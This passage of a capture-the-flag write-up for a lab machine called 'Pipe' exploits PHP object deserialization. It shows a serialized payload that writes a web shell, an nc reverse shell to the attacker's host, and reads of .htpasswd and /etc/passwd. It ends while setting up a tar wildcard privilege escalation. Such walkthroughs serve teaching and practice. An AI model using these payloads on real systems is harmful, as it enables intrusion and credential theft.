&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;O:4:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Info&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:4:&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'info_form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;The Treachery of Images&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&amp;lt;i&amp;gt;&lt;/span&gt;The Treachery of Images&lt;span class=&quot;nt&quot;&gt;&amp;lt;/i&amp;gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
From Wikipedia, the free encyclopedia
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
The Treachery of Images (French: La trahison des images, 1928â29, sometimes translated as The Treason of Images) is a painting by the Belgian surrealist painter RenÃ© Magritte, painted when Magritte was 30 years old. The picture shows a pipe. Below it, Magritte painted, &quot;Ceci n'est pas une pipe.&quot; [sÉ.si ne pazâ¿yn pip], French for &quot;This is not a pipe.&quot;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
&quot;The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it's just a representation, is it not? So if I had written on my picture 'This is a pipe', I'd have been lying!&quot;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
His statement is taken to mean that the painting itself is not a pipe. The painting is merely an image of a pipe. Hence, the description, &quot;this is not a pipe.&quot; The theme of pipes with the text &quot;Ceci n'est pas une pipe&quot; is extended in his 1966 painting, Les Deux MystÃ¨res. It is currently on display at the Los Angeles County Museum of Art.
The painting is sometimes given as an example of meta message conveyed by paralanguage. Compare with Korzybski's &quot;The word is not the thing&quot; and &quot;The map is not the territory&quot;.
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width:500px;overflow:hidden;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;images/pipe.jpg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;400px&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;auto&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;border=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info_form&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;param&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_form(); return false;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Show Artist Info.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But browser view will be much better. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/access_granted.png&quot; alt=&quot;Content&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see that there's the link, but clicking on it seemed to be broken, nothing was happening. After looking at Burp, I saw that it sends a parameter to the website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;POST /index.php HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.56.103/index.php
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 225

param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And after decoding it we get a serialized message! That's where this scripts were used. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/burp_encoder.png&quot; alt=&quot;Encoder&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let's take a closer look at it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;O:4:&quot;Info&quot;:4:{s:2:&quot;id&quot;;i:1;s:9:&quot;firstname&quot;;s:4:&quot;Rene&quot;;s:7:&quot;surname&quot;;s:8:&quot;Margitte&quot;;s:7:&quot;artwork&quot;;s:23:&quot;The+Treachery+of+Images&quot;;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, after a long read of the scripts, their logic and how they work, I managed to write a simple serialized object that will take GET parameters as commands, and execute them. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;O:3:&quot;Log&quot;:2:{s:8:&quot;filename&quot;;s:30:&quot;/var/www/html/scriptz/shell.php&quot;;s:4:&quot;data&quot;;s:12:&quot;&amp;lt;?php echo system($_GET['cmd']); ?&amp;gt;&quot;;}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now it's time to encode it as URL and paste into the repeater. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/pipe/burp_repeater.png&quot; alt=&quot;Repeater&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It works, refreshing the &lt;b&gt;scriptz&lt;/b&gt; directory showed that a new file appeared! Let's test it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.56.103/scriptz/shell.php?cmd=whoami
www-data

http://192.168.56.103/scriptz/shell.php?cmd=uname%20-a
Linux pipe 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, it's now possible to inject commands. After looking for ways to reverse the shell, I found that &lt;b&gt;netcat&lt;/b&gt; was installed, which will make it much easier. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://192.168.56.103/scriptz/shell.php?cmd=nc%20-e%20/bin/sh%20192.168.56.102%201234

root@kali:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 49960
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we have the shell. We can use this Python trick to spawn &lt;b&gt;bash&lt;/b&gt; shell. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@pipe:/var/www/html/scriptz&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Everything is working so far. But, what was the password during the authentication?  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/var/www/html/scriptz&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../
www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 36
drwxr-xr-x 4 www-data www-data 4096 Jul  9  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root     root     4096 Jul  5  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  137 Jul  6  2015 .htaccess
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data   43 Jul  6  2015 .htpasswd
drwxr-xr-x 2 www-data www-data 4096 Jul  6  2015 images
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data 2801 Jul  9  2015 index.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  150 Jul  6  2015 info.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 www-data www-data  474 Jul  6  2015 log.php
drwxr-xr-x 2 www-data www-data 4096 Jul 30 06:00 scriptz
www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .htpasswd
rene:&lt;span class=&quot;nv&quot;&gt;$apr1$wfYjXf4U$0ZZ&lt;/span&gt;.qhGGrtkOxvKr5WFqX/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As it wasn't essential, I decided to find it as they may sometimes hold valuable information. But after looking at &lt;b&gt;/etc/passwd&lt;/b&gt; I noticed account using the same name &lt;b&gt;rene&lt;/b&gt;. Let's check &lt;strike&gt;her&lt;/strike&gt;  &lt;a href=&quot;https://en.wikipedia.org/wiki/Ren%C3%A9&quot;&gt;his&lt;/a&gt; home directory. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
rene:x:1000:1000:Rene Magritte,,,:/home/rene:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene
www-data@pipe:/home/rene&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 24
drwxr-xr-x 3 rene rene 4096 Jul  6  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root root 4096 Jul  5  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene  220 Jul  5  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 3515 Jul  5  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene  675 Jul  5  2015 .profile
drwxrwxrwx 2 rene rene 4096 Jul 30 06:21 backup
www-data@pipe:/home/rene&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd  &lt;/span&gt;backup
&lt;span class=&quot;nb&quot;&gt;cd  &lt;/span&gt;backup
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 72
drwxrwxrwx 2 rene rene  4096 Jul 30 06:21 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's an automated backup! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 84
drwxrwxrwx 2 rene rene  4096 Jul 30 06:22 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 rene rene  4096 Jul  6  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 50123 Jul 30 06:20 backup.tar.gz
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 11529 Jul 30 06:22 sys-1884.BAK
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 rene rene 10605 Jul 30 06:21 sys-2875.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's look at the crontab. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;span class=&quot;c&quot;&gt;# /etc/crontab: system-wide crontab&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Unlike any other crontab you don't have to run the `crontab'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# command to install the new version when you edit this file&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# and files in /etc/cron.d. These files also have username fields,&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# that none of the other crontabs do.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

&lt;span class=&quot;c&quot;&gt;# m h dom mon dow user	command&lt;/span&gt;
17 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.hourly
25 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.daily &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
47 6	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 7	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.weekly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
52 6	1 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;	root	&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /usr/sbin/anacron &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; run-parts &lt;span class=&quot;nt&quot;&gt;--report&lt;/span&gt; /etc/cron.monthly &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root /root/create_backup.sh
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/5 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; root /usr/bin/compress.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It is also possible to read &lt;b&gt;compress.sh&lt;/b&gt; script. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/compress.sh        
 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/bin/compress.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;

rm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /home/rene/backup/backup.tar.gz
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/rene/backup
&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;cfz /home/rene/backup/backup.tar.gz &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
chown rene:rene /home/rene/backup/backup.tar.gz
rm &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /home/rene/backup/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.BAK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;A wildcard. After reading about &lt;a href=&quot;http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt&quot;&gt;&lt;b&gt;Unix wildcard exploit&lt;/b&gt;&lt;/a&gt;, it may be possible to gain root access. But firstly, what kind of shells are installed on the server? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;sh
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;sh
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 1029624 Jul 13  2014 /bin/bash
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root  125400 Jul  8  2014 /bin/dash
lrwxrwxrwx 1 root root       4 Jul 13  2014 /bin/rbash -&amp;gt; bash
lrwxrwxrwx 1 root root       4 Jul  8  2014 /bin/sh -&amp;gt; dash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, there is &lt;b&gt;/bin/dash&lt;/b&gt; installed on the server. Now it's time to create a script that will allow us to root the box. &lt;/p&gt;

